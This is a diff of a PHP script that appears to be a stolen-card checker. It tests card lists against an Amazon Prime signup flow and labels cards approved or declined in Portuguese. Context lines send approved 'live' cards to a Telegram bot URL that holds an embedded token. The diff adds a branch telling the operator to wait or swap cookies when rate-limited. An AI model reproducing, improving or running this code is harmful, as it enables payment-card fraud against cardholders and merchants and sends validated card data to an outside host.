@@ -1007,7 +1007,7 @@ deletecard($datajson);
 if (strpos($mesgirespfim, 'BILLING_ADDRESS_RESTRICTED') !== false || strpos($mesgirespfim, 'Non è stato possibile completare la tua iscrizione a Prime. Ti consigliamo di riprovare durante il proceso di checkout.') !== false) {
     $end_time = microtime(true);
     $processing_time = number_format($end_time - $start_time, 2);
-    echo "Aprovada $lista | Authorised  usa | Tempo: {$processing_time}s";
+    echo "Aprovada $lista | Authorised  🇺🇸 | Tempo: {$processing_time}s";
     
     // Enviar live aprovada para o bot do Telegram
 $mensagem = urlencode("✅ Live aprovada: $lista | Tempo: {$processing_time}s"); // substitua pela variável correta
@@ -1016,18 +1016,23 @@ file_get_contents("https://api.telegram.org/bot7748457693:AAHGW30nEHdbGBI6pCZNdQ
 } else if (strpos($mesgirespfim, 'InvalidInput') !== false) {
     $end_time = microtime(true);
     $processing_time = number_format($end_time - $start_time, 2);
-    echo "Reprovada $lista | PAGAMENTO RECUSADO  usa | Tempo: {$processing_time}s";
+    echo "Reprovada $lista | PAGAMENTO RECUSADO  🇺🇸 | Tempo: {$processing_time}s";
     exit();
 } else if (strpos($mesgirespfim, 'HARDVET_VERIFICATION_FAILED') !== false || strpos($mesgirespfim, 'hardVet') !== false || strpos($mesgirespfim, "HARDVET_VERIFICATION_FAILED") !== false) {
     $end_time = microtime(true);
     $processing_time = number_format($end_time - $start_time, 2);
-    echo "Reprovada $lista | PAGAMENTO RECUSADO  usa | Tempo: {$processing_time}s";
+    echo "Reprovada $lista | PAGAMENTO RECUSADO  🇺🇸 | Tempo: {$processing_time}s";
     exit();
 } elseif (strpos($mesgirespfim, 'There was an error validating your payment method') !== false || strpos($mesgirespfim, "There was an error validating your payment method. Please update or add a new payment method and try again") !== false) {
     $end_time = microtime(true);
     $processing_time = number_format($end_time - $start_time, 2);
-    echo "Reprovada $lista | ERRO NA VALIDAÇÃO DO MÉTODO DE PAGAMENTO  usa | Tempo: {$processing_time}s";
+    echo "Reprovada $lista | ERRO NA VALIDAÇÃO DO MÉTODO DE PAGAMENTO  🇺🇸 | Tempo: {$processing_time}s";
     exit();
+} else if (strpos($mesgirespfim, 'You have exceeded the maximum attempts allowed, please retry after 2 hours.') !== false) {
+    $end_time = microtime(true);
+    $processing_time = number_format($end_time - $start_time, 2);
+    echo "Reprovada $lista | COOKIES LIMITE AGUARDE 2h OU TROQUE 🇺🇸 | Tempo: {$processing_time}s";
+    exit();	
 } else {
     $end_time = microtime(true);
     $processing_time = number_format($end_time - $start_time, 2);
@@ -1039,8 +1044,9 @@ file_get_contents("https://api.telegram.org/bot7748457693:AAHGW30nEHdbGBI6pCZNdQ
     $end_time = microtime(true);
     $processing_time = number_format($end_time - $start_time, 2);
     $cardInfo = bin($bin);
-    echo "Reprovada $lista | CARTÃO INVÁLIDO  usa | Tempo: {$processing_time}s";
+    echo "Reprovada $lista | CARTÃO INVÁLIDO  🇺🇸 | Tempo: {$processing_time}s";
     header('HTTP/1.1 200 OK');
     exit();
 }
 ?>
+
